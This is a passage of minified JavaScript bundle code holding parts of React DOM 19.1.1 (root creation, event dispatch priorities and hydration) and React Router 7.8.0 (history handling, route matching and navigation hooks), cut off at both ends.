			(e = new b0(e, t, l, i, s, m, S, R)),
			(t = 1),
			u === !0 && (t |= 24),
			(u = nt(3, null, null, t)),
			(e.current = u),
			(u.stateNode = e),
			(t = Qu()),
			t.refCount++,
			(e.pooledCache = t),
			t.refCount++,
			(u.memoizedState = { element: a, isDehydrated: l, cache: t }),
			Ju(u),
			e
		);
	}
	function x2(e) {
		return e ? ((e = la), e) : la;
	}
	function g2(e, t, l, a, n, u) {
		(n = x2(n)),
			a.context === null ? (a.context = n) : (a.pendingContext = n),
			(a = tl(t)),
			(a.payload = { element: l }),
			(u = u === void 0 ? null : u),
			u !== null && (a.callback = u),
			(l = ll(e, a, t)),
			l !== null && (st(l, e, t), Wa(l, e, t));
	}
	function v2(e, t) {
		if (((e = e.memoizedState), e !== null && e.dehydrated !== null)) {
			var l = e.retryLane;
			e.retryLane = l !== 0 && l < t ? l : t;
		}
	}
	function rc(e, t) {
		v2(e, t), (e = e.alternate) && v2(e, t);
	}
	function y2(e) {
		if (e.tag === 13) {
			var t = ta(e, 67108864);
			t !== null && st(t, e, 67108864), rc(e, 67108864);
		}
	}
	var Zn = !0;
	function C0(e, t, l, a) {
		var n = M.T;
		M.T = null;
		var u = B.p;
		try {
			(B.p = 2), oc(e, t, l, a);
		} finally {
			(B.p = u), (M.T = n);
		}
	}
	function S0(e, t, l, a) {
		var n = M.T;
		M.T = null;
		var u = B.p;
		try {
			(B.p = 8), oc(e, t, l, a);
		} finally {
			(B.p = u), (M.T = n);
		}
	}
	function oc(e, t, l, a) {
		if (Zn) {
			var n = dc(a);
			if (n === null) Pi(e, t, a, Xn, l), C2(e, a);
			else if (j0(n, e, t, l, a)) a.stopPropagation();
			else if ((C2(e, a), t & 4 && -1 < E0.indexOf(e))) {
				for (; n !== null; ) {
					var u = Xl(n);
					if (u !== null)
						switch (u.tag) {
							case 3:
								if (
									((u = u.stateNode),
									u.current.memoizedState.isDehydrated)
								) {
									var i = Sl(u.pendingLanes);
									if (i !== 0) {
										var s = u;
										for (
											s.pendingLanes |= 2,
												s.entangledLanes |= 2;
											i;

										) {
											var m = 1 << (31 - lt(i));
											(s.entanglements[1] |= m),
												(i &= ~m);
										}
										wt(u),
											(re & 6) === 0 &&
												((Tn = Et() + 500), h1(0));
									}
								}
								break;
							case 13:
								(s = ta(u, 2)),
									s !== null && st(s, u, 2),
									wn(),
									rc(u, 2);
						}
					if (
						((u = dc(a)), u === null && Pi(e, t, a, Xn, l), u === n)
					)
						break;
					n = u;
				}
				n !== null && a.stopPropagation();
			} else Pi(e, t, a, null, l);
		}
	}
	function dc(e) {
		return (e = gu(e)), hc(e);
	}
	var Xn = null;
	function hc(e) {
		if (((Xn = null), (e = Zl(e)), e !== null)) {
			var t = v(e);
			if (t === null) e = null;
			else {
				var l = t.tag;
				if (l === 13) {
					if (((e = N(t)), e !== null)) return e;
					e = null;
				} else if (l === 3) {
					if (t.stateNode.current.memoizedState.isDehydrated)
						return t.tag === 3 ? t.stateNode.containerInfo : null;
					e = null;
				} else t !== e && (e = null);
			}
		}
		return (Xn = e), null;
	}
	function b2(e) {
		switch (e) {
			case "beforetoggle":
			case "cancel":
			case "click":
			case "close":
			case "contextmenu":
			case "copy":
			case "cut":
			case "auxclick":
			case "dblclick":
			case "dragend":
			case "dragstart":
			case "drop":
			case "focusin":
			case "focusout":
			case "input":
			case "invalid":
			case "keydown":
			case "keypress":
			case "keyup":
			case "mousedown":
			case "mouseup":
			case "paste":
			case "pause":
			case "play":
			case "pointercancel":
			case "pointerdown":
			case "pointerup":
			case "ratechange":
			case "reset":
			case "resize":
			case "seeked":
			case "submit":
			case "toggle":
			case "touchcancel":
			case "touchend":
			case "touchstart":
			case "volumechange":
			case "change":
			case "selectionchange":
			case "textInput":
			case "compositionstart":
			case "compositionend":
			case "compositionupdate":
			case "beforeblur":
			case "afterblur":
			case "beforeinput":
			case "blur":
			case "fullscreenchange":
			case "focus":
			case "hashchange":
			case "popstate":
			case "select":
			case "selectstart":
				return 2;
			case "drag":
			case "dragenter":
			case "dragexit":
			case "dragleave":
			case "dragover":
			case "mousemove":
			case "mouseout":
			case "mouseover":
			case "pointermove":
			case "pointerout":
			case "pointerover":
			case "scroll":
			case "touchmove":
			case "wheel":
			case "mouseenter":
			case "mouseleave":
			case "pointerenter":
			case "pointerleave":
				return 8;
			case "message":
				switch (co()) {
					case _c:
						return 2;
					case Dc:
						return 8;
					case D1:
					case fo:
						return 32;
					case Uc:
						return 268435456;
					default:
						return 32;
				}
			default:
				return 32;
		}
	}
	var mc = !1,
		pl = null,
		xl = null,
		gl = null,
		C1 = new Map(),
		S1 = new Map(),
		vl = [],
		E0 =
			"mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(
				" "
			);
	function C2(e, t) {
		switch (e) {
			case "focusin":
			case "focusout":
				pl = null;
				break;
			case "dragenter":
			case "dragleave":
				xl = null;
				break;
			case "mouseover":
			case "mouseout":
				gl = null;
				break;
			case "pointerover":
			case "pointerout":
				C1.delete(t.pointerId);
				break;
			case "gotpointercapture":
			case "lostpointercapture":
				S1.delete(t.pointerId);
		}
	}
	function E1(e, t, l, a, n, u) {
		return e === null || e.nativeEvent !== u
			? ((e = {
					blockedOn: t,
					domEventName: l,
					eventSystemFlags: a,
					nativeEvent: u,
					targetContainers: [n],
			  }),
			  t !== null && ((t = Xl(t)), t !== null && y2(t)),
			  e)
			: ((e.eventSystemFlags |= a),
			  (t = e.targetContainers),
			  n !== null && t.indexOf(n) === -1 && t.push(n),
			  e);
	}
	function j0(e, t, l, a, n) {
		switch (t) {
			case "focusin":
				return (pl = E1(pl, e, t, l, a, n)), !0;
			case "dragenter":
				return (xl = E1(xl, e, t, l, a, n)), !0;
			case "mouseover":
				return (gl = E1(gl, e, t, l, a, n)), !0;
			case "pointerover":
				var u = n.pointerId;
				return C1.set(u, E1(C1.get(u) || null, e, t, l, a, n)), !0;
			case "gotpointercapture":
				return (
					(u = n.pointerId),
					S1.set(u, E1(S1.get(u) || null, e, t, l, a, n)),
					!0
				);
		}
		return !1;
	}
	function S2(e) {
		var t = Zl(e.target);
		if (t !== null) {
			var l = v(t);
			if (l !== null) {
				if (((t = l.tag), t === 13)) {
					if (((t = N(l)), t !== null)) {
						(e.blockedOn = t),
							go(e.priority, function () {
								if (l.tag === 13) {
									var a = ft();
									a = iu(a);
									var n = ta(l, a);
									n !== null && st(n, l, a), rc(l, a);
								}
							});
						return;
					}
				} else if (
					t === 3 &&
					l.stateNode.current.memoizedState.isDehydrated
				) {
					e.blockedOn =
						l.tag === 3 ? l.stateNode.containerInfo : null;
					return;
				}
			}
		}
		e.blockedOn = null;
	}
	function Qn(e) {
		if (e.blockedOn !== null) return !1;
		for (var t = e.targetContainers; 0 < t.length; ) {
			var l = dc(e.nativeEvent);
			if (l === null) {
				l = e.nativeEvent;
				var a = new l.constructor(l.type, l);
				(xu = a), l.target.dispatchEvent(a), (xu = null);
			} else
				return (t = Xl(l)), t !== null && y2(t), (e.blockedOn = l), !1;
			t.shift();
		}
		return !0;
	}
	function E2(e, t, l) {
		Qn(e) && l.delete(t);
	}
	function N0() {
		(mc = !1),
			pl !== null && Qn(pl) && (pl = null),
			xl !== null && Qn(xl) && (xl = null),
			gl !== null && Qn(gl) && (gl = null),
			C1.forEach(E2),
			S1.forEach(E2);
	}
	function Vn(e, t) {
		e.blockedOn === t &&
			((e.blockedOn = null),
			mc ||
				((mc = !0),
				c.unstable_scheduleCallback(c.unstable_NormalPriority, N0)));
	}
	var kn = null;
	function j2(e) {
		kn !== e &&
			((kn = e),
			c.unstable_scheduleCallback(c.unstable_NormalPriority, function () {
				kn === e && (kn = null);
				for (var t = 0; t < e.length; t += 3) {
					var l = e[t],
						a = e[t + 1],
						n = e[t + 2];
					if (typeof a != "function") {
						if (hc(a || l) === null) continue;
						break;
					}
					var u = Xl(l);
					u !== null &&
						(e.splice(t, 3),
						(t -= 3),
						hi(
							u,
							{
								pending: !0,
								data: n,
								method: l.method,
								action: a,
							},
							a,
							n
						));
				}
			}));
	}
	function j1(e) {
		function t(m) {
			return Vn(m, e);
		}
		pl !== null && Vn(pl, e),
			xl !== null && Vn(xl, e),
			gl !== null && Vn(gl, e),
			C1.forEach(t),
			S1.forEach(t);
		for (var l = 0; l < vl.length; l++) {
			var a = vl[l];
			a.blockedOn === e && (a.blockedOn = null);
		}
		for (; 0 < vl.length && ((l = vl[0]), l.blockedOn === null); )
			S2(l), l.blockedOn === null && vl.shift();
		if (((l = (e.ownerDocument || e).$$reactFormReplay), l != null))
			for (a = 0; a < l.length; a += 3) {
				var n = l[a],
					u = l[a + 1],
					i = n[Je] || null;
				if (typeof u == "function") i || j2(l);
				else if (i) {
					var s = null;
					if (u && u.hasAttribute("formAction")) {
						if (((n = u), (i = u[Je] || null))) s = i.formAction;
						else if (hc(n) !== null) continue;
					} else s = i.action;
					typeof s == "function"
						? (l[a + 1] = s)
						: (l.splice(a, 3), (a -= 3)),
						j2(l);
				}
			}
	}
	function pc(e) {
		this._internalRoot = e;
	}
	(Kn.prototype.render = pc.prototype.render =
		function (e) {
			var t = this._internalRoot;
			if (t === null) throw Error(r(409));
			var l = t.current,
				a = ft();
			g2(l, a, e, t, null, null);
		}),
		(Kn.prototype.unmount = pc.prototype.unmount =
			function () {
				var e = this._internalRoot;
				if (e !== null) {
					this._internalRoot = null;
					var t = e.containerInfo;
					g2(e.current, 2, null, e, null, null), wn(), (t[Gl] = null);
				}
			});
	function Kn(e) {
		this._internalRoot = e;
	}
	Kn.prototype.unstable_scheduleHydration = function (e) {
		if (e) {
			var t = Yc();
			e = { blockedOn: null, target: e, priority: t };
			for (
				var l = 0;
				l < vl.length && t !== 0 && t < vl[l].priority;
				l++
			);
			vl.splice(l, 0, e), l === 0 && S2(e);
		}
	};
	var N2 = d.version;
	if (N2 !== "19.1.1") throw Error(r(527, N2, "19.1.1"));
	B.findDOMNode = function (e) {
		var t = e._reactInternals;
		if (t === void 0)
			throw typeof e.render == "function"
				? Error(r(188))
				: ((e = Object.keys(e).join(",")), Error(r(268, e)));
		return (
			(e = b(t)),
			(e = e !== null ? p(e) : null),
			(e = e === null ? null : e.stateNode),
			e
		);
	};
	var T0 = {
		bundleType: 0,
		version: "19.1.1",
		rendererPackageName: "react-dom",
		currentDispatcherRef: M,
		reconcilerVersion: "19.1.1",
	};
	if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
		var Jn = __REACT_DEVTOOLS_GLOBAL_HOOK__;
		if (!Jn.isDisabled && Jn.supportsFiber)
			try {
				(wa = Jn.inject(T0)), (tt = Jn);
			} catch {}
	}
	return (
		(T1.createRoot = function (e, t) {
			if (!h(e)) throw Error(r(299));
			var l = !1,
				a = "",
				n = Gs,
				u = Zs,
				i = Xs,
				s = null;
			return (
				t != null &&
					(t.unstable_strictMode === !0 && (l = !0),
					t.identifierPrefix !== void 0 && (a = t.identifierPrefix),
					t.onUncaughtError !== void 0 && (n = t.onUncaughtError),
					t.onCaughtError !== void 0 && (u = t.onCaughtError),
					t.onRecoverableError !== void 0 &&
						(i = t.onRecoverableError),
					t.unstable_transitionCallbacks !== void 0 &&
						(s = t.unstable_transitionCallbacks)),
				(t = p2(e, 1, !1, null, null, l, a, n, u, i, s, null)),
				(e[Gl] = t.current),
				Fi(e),
				new pc(t)
			);
		}),
		(T1.hydrateRoot = function (e, t, l) {
			if (!h(e)) throw Error(r(299));
			var a = !1,
				n = "",
				u = Gs,
				i = Zs,
				s = Xs,
				m = null,
				S = null;
			return (
				l != null &&
					(l.unstable_strictMode === !0 && (a = !0),
					l.identifierPrefix !== void 0 && (n = l.identifierPrefix),
					l.onUncaughtError !== void 0 && (u = l.onUncaughtError),
					l.onCaughtError !== void 0 && (i = l.onCaughtError),
					l.onRecoverableError !== void 0 &&
						(s = l.onRecoverableError),
					l.unstable_transitionCallbacks !== void 0 &&
						(m = l.unstable_transitionCallbacks),
					l.formState !== void 0 && (S = l.formState)),
				(t = p2(e, 1, !0, t, l ?? null, a, n, u, i, s, m, S)),
				(t.context = x2(null)),
				(l = t.current),
				(a = ft()),
				(a = iu(a)),
				(n = tl(a)),
				(n.callback = null),
				ll(l, n, a),
				(l = a),
				(t.current.lanes = l),
				Oa(t, l),
				wt(t),
				(e[Gl] = t.current),
				Fi(e),
				new Kn(t)
			);
		}),
		(T1.version = "19.1.1"),
		T1
	);
}
var U2;
function H0() {
	if (U2) return vc.exports;
	U2 = 1;
	function c() {
		if (
			!(
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" ||
				typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"
			)
		)
			try {
				__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(c);
			} catch (d) {
				console.error(d);
			}
	}
	return c(), (vc.exports = U0()), vc.exports;
}
var L0 = H0();
/**
 * react-router v7.8.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ var H2 = "popstate";
function B0(c = {}) {
	function d(r, h) {
		let { pathname: v, search: N, hash: z } = r.location;
		return jc(
			"",
			{ pathname: v, search: N, hash: z },
			(h.state && h.state.usr) || null,
			(h.state && h.state.key) || "default"
		);
	}
	function o(r, h) {
		return typeof h == "string" ? h : w1(h);
	}
	return Y0(d, o, null, c);
}
function Se(c, d) {
	if (c === !1 || c === null || typeof c > "u") throw new Error(d);
}
function Mt(c, d) {
	if (!c) {
		typeof console < "u" && console.warn(d);
		try {
			throw new Error(d);
		} catch {}
	}
}
function q0() {
	return Math.random().toString(36).substring(2, 10);
}
function L2(c, d) {
	return { usr: c.state, key: c.key, idx: d };
}
function jc(c, d, o = null, r) {
	return {
		pathname: typeof c == "string" ? c : c.pathname,
		search: "",
		hash: "",
		...(typeof d == "string" ? Ta(d) : d),
		state: o,
		key: (d && d.key) || r || q0(),
	};
}
function w1({ pathname: c = "/", search: d = "", hash: o = "" }) {
	return (
		d && d !== "?" && (c += d.charAt(0) === "?" ? d : "?" + d),
		o && o !== "#" && (c += o.charAt(0) === "#" ? o : "#" + o),
		c
	);
}
function Ta(c) {
	let d = {};
	if (c) {
		let o = c.indexOf("#");
		o >= 0 && ((d.hash = c.substring(o)), (c = c.substring(0, o)));
		let r = c.indexOf("?");
		r >= 0 && ((d.search = c.substring(r)), (c = c.substring(0, r))),
			c && (d.pathname = c);
	}
	return d;
}
function Y0(c, d, o, r = {}) {
	let { window: h = document.defaultView, v5Compat: v = !1 } = r,
		N = h.history,
		z = "POP",
		b = null,
		p = w();
	p == null && ((p = 0), N.replaceState({ ...N.state, idx: p }, ""));
	function w() {
		return (N.state || { idx: null }).idx;
	}
	function D() {
		z = "POP";
		let G = w(),
			H = G == null ? null : G - p;
		(p = G), b && b({ action: z, location: Q.location, delta: H });
	}
	function U(G, H) {
		z = "PUSH";
		let ie = jc(Q.location, G, H);
		p = w() + 1;
		let I = L2(ie, p),
			be = Q.createHref(ie);
		try {
			N.pushState(I, "", be);
		} catch (F) {
			if (F instanceof DOMException && F.name === "DataCloneError")
				throw F;
			h.location.assign(be);
		}
		v && b && b({ action: z, location: Q.location, delta: 1 });
	}
	function J(G, H) {
		z = "REPLACE";
		let ie = jc(Q.location, G, H);
		p = w();
		let I = L2(ie, p),
			be = Q.createHref(ie);
		N.replaceState(I, "", be),
			v && b && b({ action: z, location: Q.location, delta: 0 });
	}
	function X(G) {
		return G0(G);
	}
	let Q = {
		get action() {
			return z;
		},
		get location() {
			return c(h, N);
		},
		listen(G) {
			if (b)
				throw new Error("A history only accepts one active listener");
			return (
				h.addEventListener(H2, D),
				(b = G),
				() => {
					h.removeEventListener(H2, D), (b = null);
				}
			);
		},
		createHref(G) {
			return d(h, G);
		},
		createURL: X,
		encodeLocation(G) {
			let H = X(G);
			return { pathname: H.pathname, search: H.search, hash: H.hash };
		},
		push: U,
		replace: J,
		go(G) {
			return N.go(G);
		},
	};
	return Q;
}
function G0(c, d = !1) {
	let o = "http://localhost";
	typeof window < "u" &&
		(o =
			window.location.origin !== "null"
				? window.location.origin
				: window.location.href),
		Se(o, "No window.location.(origin|href) available to create URL");
	let r = typeof c == "string" ? c : w1(c);
	return (
		(r = r.replace(/ $/, "%20")),
		!d && r.startsWith("//") && (r = o + r),
		new URL(r, o)
	);
}
function G2(c, d, o = "/") {
	return Z0(c, d, o, !1);
}
function Z0(c, d, o, r) {
	let h = typeof d == "string" ? Ta(d) : d,
		v = Kt(h.pathname || "/", o);
	if (v == null) return null;
	let N = Z2(c);
	X0(N);
	let z = null;
	for (let b = 0; z == null && b < N.length; ++b) {
		let p = e3(v);
		z = P0(N[b], p, r);
	}
	return z;
}
function Z2(c, d = [], o = [], r = "") {
	let h = (v, N, z) => {
		let b = {
			relativePath: z === void 0 ? v.path || "" : z,
			caseSensitive: v.caseSensitive === !0,
			childrenIndex: N,
			route: v,
		};
		b.relativePath.startsWith("/") &&
			(Se(
				b.relativePath.startsWith(r),
				`Absolute route path "${b.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`
			),
			(b.relativePath = b.relativePath.slice(r.length)));
		let p = kt([r, b.relativePath]),
			w = o.concat(b);
		v.children &&
			v.children.length > 0 &&
			(Se(
				v.index !== !0,
				`Index routes must not have child routes. Please remove all child routes from route path "${p}".`
			),
			Z2(v.children, d, w, p)),
			!(v.path == null && !v.index) &&
				d.push({ path: p, score: W0(p, v.index), routesMeta: w });
	};
	return (
		c.forEach((v, N) => {
			if (v.path === "" || !v.path?.includes("?")) h(v, N);
			else for (let z of X2(v.path)) h(v, N, z);
		}),
		d
	);
}
function X2(c) {
	let d = c.split("/");
	if (d.length === 0) return [];
	let [o, ...r] = d,
		h = o.endsWith("?"),
		v = o.replace(/\?$/, "");
	if (r.length === 0) return h ? [v, ""] : [v];
	let N = X2(r.join("/")),
		z = [];
	return (
		z.push(...N.map((b) => (b === "" ? v : [v, b].join("/")))),
		h && z.push(...N),
		z.map((b) => (c.startsWith("/") && b === "" ? "/" : b))
	);
}
function X0(c) {
	c.sort((d, o) =>
		d.score !== o.score
			? o.score - d.score
			: F0(
					d.routesMeta.map((r) => r.childrenIndex),
					o.routesMeta.map((r) => r.childrenIndex)
			  )
	);
}
var Q0 = /^:[\w-]+$/,
	V0 = 3,
	k0 = 2,
	K0 = 1,
	J0 = 10,
	$0 = -2,
	B2 = (c) => c === "*";
function W0(c, d) {
	let o = c.split("/"),
		r = o.length;
	return (
		o.some(B2) && (r += $0),
		d && (r += k0),
		o
			.filter((h) => !B2(h))
			.reduce((h, v) => h + (Q0.test(v) ? V0 : v === "" ? K0 : J0), r)
	);
}
function F0(c, d) {
	return c.length === d.length && c.slice(0, -1).every((r, h) => r === d[h])
		? c[c.length - 1] - d[d.length - 1]
		: 0;
}
function P0(c, d, o = !1) {
	let { routesMeta: r } = c,
		h = {},
		v = "/",
		N = [];
	for (let z = 0; z < r.length; ++z) {
		let b = r[z],
			p = z === r.length - 1,
			w = v === "/" ? d : d.slice(v.length) || "/",
			D = Pn(
				{
					path: b.relativePath,
					caseSensitive: b.caseSensitive,
					end: p,
				},
				w
			),
			U = b.route;
		if (
			(!D &&
				p &&
				o &&
				!r[r.length - 1].route.index &&
				(D = Pn(
					{
						path: b.relativePath,
						caseSensitive: b.caseSensitive,
						end: !1,
					},
					w
				)),
			!D)
		)
			return null;
		Object.assign(h, D.params),
			N.push({
				params: h,
				pathname: kt([v, D.pathname]),
				pathnameBase: n3(kt([v, D.pathnameBase])),
				route: U,
			}),
			D.pathnameBase !== "/" && (v = kt([v, D.pathnameBase]));
	}
	return N;
}
function Pn(c, d) {
	typeof c == "string" && (c = { path: c, caseSensitive: !1, end: !0 });
	let [o, r] = I0(c.path, c.caseSensitive, c.end),
		h = d.match(o);
	if (!h) return null;
	let v = h[0],
		N = v.replace(/(.)\/+$/, "$1"),
		z = h.slice(1);
	return {
		params: r.reduce((p, { paramName: w, isOptional: D }, U) => {
			if (w === "*") {
				let X = z[U] || "";
				N = v.slice(0, v.length - X.length).replace(/(.)\/+$/, "$1");
			}
			const J = z[U];
			return (
				D && !J
					? (p[w] = void 0)
					: (p[w] = (J || "").replace(/%2F/g, "/")),
				p
			);
		}, {}),
		pathname: v,
		pathnameBase: N,
		pattern: c,
	};
}
function I0(c, d = !1, o = !0) {
	Mt(
		c === "*" || !c.endsWith("*") || c.endsWith("/*"),
		`Route path "${c}" will be treated as if it were "${c.replace(
			/\*$/,
			"/*"
		)}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${c.replace(
			/\*$/,
			"/*"
		)}".`
	);
	let r = [],
		h =
			"^" +
			c
				.replace(/\/*\*?$/, "")
				.replace(/^\/*/, "/")
				.replace(/[\\.*+^${}|()[\]]/g, "\\$&")
				.replace(
					/\/:([\w-]+)(\?)?/g,
					(N, z, b) => (
						r.push({ paramName: z, isOptional: b != null }),
						b ? "/?([^\\/]+)?" : "/([^\\/]+)"
					)
				);
	return (
		c.endsWith("*")
			? (r.push({ paramName: "*" }),
			  (h += c === "*" || c === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$"))
			: o
			? (h += "\\/*$")
			: c !== "" && c !== "/" && (h += "(?:(?=\\/|$))"),
		[new RegExp(h, d ? void 0 : "i"), r]
	);
}
function e3(c) {
	try {
		return c
			.split("/")
			.map((d) => decodeURIComponent(d).replace(/\//g, "%2F"))
			.join("/");
	} catch (d) {
		return (
			Mt(
				!1,
				`The URL path "${c}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${d}).`
			),
			c
		);
	}
}
function Kt(c, d) {
	if (d === "/") return c;
	if (!c.toLowerCase().startsWith(d.toLowerCase())) return null;
	let o = d.endsWith("/") ? d.length - 1 : d.length,
		r = c.charAt(o);
	return r && r !== "/" ? null : c.slice(o) || "/";
}
function t3(c, d = "/") {
	let {
		pathname: o,
		search: r = "",
		hash: h = "",
	} = typeof c == "string" ? Ta(c) : c;
	return {
		pathname: o ? (o.startsWith("/") ? o : l3(o, d)) : d,
		search: u3(r),
		hash: i3(h),
	};
}
function l3(c, d) {
	let o = d.replace(/\/+$/, "").split("/");
	return (
		c.split("/").forEach((h) => {
			h === ".." ? o.length > 1 && o.pop() : h !== "." && o.push(h);
		}),
		o.length > 1 ? o.join("/") : "/"
	);
}
function Sc(c, d, o, r) {
	return `Cannot include a '${c}' character in a manually specified \`to.${d}\` field [${JSON.stringify(
		r
	)}].  Please separate it out to the \`to.${o}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`;
}
function a3(c) {
	return c.filter(
		(d, o) => o === 0 || (d.route.path && d.route.path.length > 0)
	);
}
function Q2(c) {
	let d = a3(c);
	return d.map((o, r) => (r === d.length - 1 ? o.pathname : o.pathnameBase));
}
function V2(c, d, o, r = !1) {
	let h;
	typeof c == "string"
		? (h = Ta(c))
		: ((h = { ...c }),
		  Se(
				!h.pathname || !h.pathname.includes("?"),
				Sc("?", "pathname", "search", h)
		  ),
		  Se(
				!h.pathname || !h.pathname.includes("#"),
				Sc("#", "pathname", "hash", h)
		  ),
		  Se(
				!h.search || !h.search.includes("#"),
				Sc("#", "search", "hash", h)
		  ));
	let v = c === "" || h.pathname === "",
		N = v ? "/" : h.pathname,
		z;
	if (N == null) z = o;
	else {
		let D = d.length - 1;
		if (!r && N.startsWith("..")) {
			let U = N.split("/");
			for (; U[0] === ".."; ) U.shift(), (D -= 1);
			h.pathname = U.join("/");
		}
		z = D >= 0 ? d[D] : "/";
	}
	let b = t3(h, z),
		p = N && N !== "/" && N.endsWith("/"),
		w = (v || N === ".") && o.endsWith("/");
	return !b.pathname.endsWith("/") && (p || w) && (b.pathname += "/"), b;
}
var kt = (c) => c.join("/").replace(/\/\/+/g, "/"),
	n3 = (c) => c.replace(/\/+$/, "").replace(/^\/*/, "/"),
	u3 = (c) => (!c || c === "?" ? "" : c.startsWith("?") ? c : "?" + c),
	i3 = (c) => (!c || c === "#" ? "" : c.startsWith("#") ? c : "#" + c);
function c3(c) {
	return (
		c != null &&
		typeof c.status == "number" &&
		typeof c.statusText == "string" &&
		typeof c.internal == "boolean" &&
		"data" in c
	);
}
var k2 = ["POST", "PUT", "PATCH", "DELETE"];
new Set(k2);
var f3 = ["GET", ...k2];
new Set(f3);
var Aa = A.createContext(null);
Aa.displayName = "DataRouter";
var In = A.createContext(null);
In.displayName = "DataRouterState";
A.createContext(!1);
var K2 = A.createContext({ isTransitioning: !1 });
K2.displayName = "ViewTransition";
var s3 = A.createContext(new Map());
s3.displayName = "Fetchers";
var r3 = A.createContext(null);
r3.displayName = "Await";
var Ot = A.createContext(null);
Ot.displayName = "Navigation";
var M1 = A.createContext(null);
M1.displayName = "Location";
var Jt = A.createContext({ outlet: null, matches: [], isDataRoute: !1 });
Jt.displayName = "Route";
var Ac = A.createContext(null);
Ac.displayName = "RouteError";
function o3(c, { relative: d } = {}) {
	Se(
		O1(),
		"useHref() may be used only in the context of a <Router> component."
	);
	let { basename: o, navigator: r } = A.useContext(Ot),
		{ hash: h, pathname: v, search: N } = R1(c, { relative: d }),
		z = v;
	return (
		o !== "/" && (z = v === "/" ? o : kt([o, v])),
		r.createHref({ pathname: z, search: N, hash: h })
	);
}
function O1() {
	return A.useContext(M1) != null;
}
function Yl() {
	return (
		Se(
			O1(),
			"useLocation() may be used only in the context of a <Router> component."
		),
		A.useContext(M1).location
	);
}
var J2 =
	"You should call navigate() in a React.useEffect(), not when your component is first rendered.";
function $2(c) {
	A.useContext(Ot).static || A.useLayoutEffect(c);
}
function d3() {
	let { isDataRoute: c } = A.useContext(Jt);
	return c ? N3() : h3();
}
function h3() {
	Se(
		O1(),
		"useNavigate() may be used only in the context of a <Router> component."
	);
	let c = A.useContext(Aa),
		{ basename: d, navigator: o } = A.useContext(Ot),
		{ matches: r } = A.useContext(Jt),
		{ pathname: h } = Yl(),
		v = JSON.stringify(Q2(r)),
		N = A.useRef(!1);
	return (
		$2(() => {
			N.current = !0;
		}),
		A.useCallback(
			(b, p = {}) => {
				if ((Mt(N.current, J2), !N.current)) return;
				if (typeof b == "number") {
					o.go(b);
					return;
				}
				let w = V2(b, JSON.parse(v), h, p.relative === "path");
				c == null &&
					d !== "/" &&
					(w.pathname = w.pathname === "/" ? d : kt([d, w.pathname])),
					(p.replace ? o.replace : o.push)(w, p.state, p);
			},
			[d, o, v, h, c]
		)
	);
}
A.createContext(null);
function R1(c, { relative: d } = {}) {
	let { matches: o } = A.useContext(Jt),
		{ pathname: r } = Yl(),
		h = JSON.stringify(Q2(o));
	return A.useMemo(() => V2(c, JSON.parse(h), r, d === "path"), [c, h, r, d]);
}
function m3(c, d) {
	return W2(c, d);
}
function W2(c, d, o, r) {
	Se(
		O1(),
		"useRoutes() may be used only in the context of a <Router> component."
	);
	let { navigator: h } = A.useContext(Ot),
		{ matches: v } = A.useContext(Jt),
		N = v[v.length - 1],
		z = N ? N.params : {},
		b = N ? N.pathname : "/",
		p = N ? N.pathnameBase : "/",
		w = N && N.route;
	{
		let H = (w && w.path) || "";
		F2(
			b,
			!w || H.endsWith("*") || H.endsWith("*?"),
			`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${b}" (under <Route path="${H}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${H}"> to <Route path="${
				H === "/" ? "*" : `${H}/*`
			}">.`
		);
	}
	let D = Yl(),
		U;
	if (d) {
		let H = typeof d == "string" ? Ta(d) : d;
		Se(
			p === "/" || H.pathname?.startsWith(p),
			`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${p}" but pathname "${H.pathname}" was given in the \`location\` prop.`
		),
			(U = H);
	} else U = D;
	let J = U.pathname || "/",
		X = J;
	if (p !== "/") {
		let H = p.replace(/^\//, "").split("/");
		X = "/" + J.replace(/^\//, "").split("/").slice(H.length).join("/");
	}
	let Q = G2(c, { pathname: X });
	Mt(
		w || Q != null,
		`No routes matched location "${U.pathname}${U.search}${U.hash}" `
	),
		Mt(
			Q == null ||
				Q[Q.length - 1].route.element !== void 0 ||
				Q[Q.length - 1].route.Component !== void 0 ||
				Q[Q.length - 1].route.lazy !== void 0,
			`Matched leaf route at location "${U.pathname}${U.search}${U.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`
		);
	let G = y3(
		Q &&
			Q.map((H) =>
				Object.assign({}, H, {
					params: Object.assign({}, z, H.params),
					pathname: kt([
						p,
						h.encodeLocation
							? h.encodeLocation(H.pathname).pathname
							: H.pathname,
					]),
					pathnameBase:
						H.pathnameBase === "/"
							? p
							: kt([
									p,
									h.encodeLocation
										? h.encodeLocation(H.pathnameBase)
												.pathname
										: H.pathnameBase,
							  ]),
				})
			),
		v,
		o,
		r
	);
	return d && G
		? A.createElement(
				M1.Provider,
				{
					value: {
						location: {
							pathname: "/",
							search: "",
							hash: "",
							state: null,
							key: "default",
							...U,
						},
						navigationType: "POP",
					},
				},
				G
		  )
		: G;
}
function p3() {
	let c = j3(),
		d = c3(c)
			? `${c.status} ${c.statusText}`
			: c instanceof Error
			? c.message
			: JSON.stringify(c),
		o = c instanceof Error ? c.stack : null,
		r = "rgba(200,200,200, 0.5)",
		h = { padding: "0.5rem", backgroundColor: r },
		v = { padding: "2px 4px", backgroundColor: r },
		N = null;
	return (
		console.error(
			"Error handled by React Router default ErrorBoundary:",
			c
		),
		(N = A.createElement(
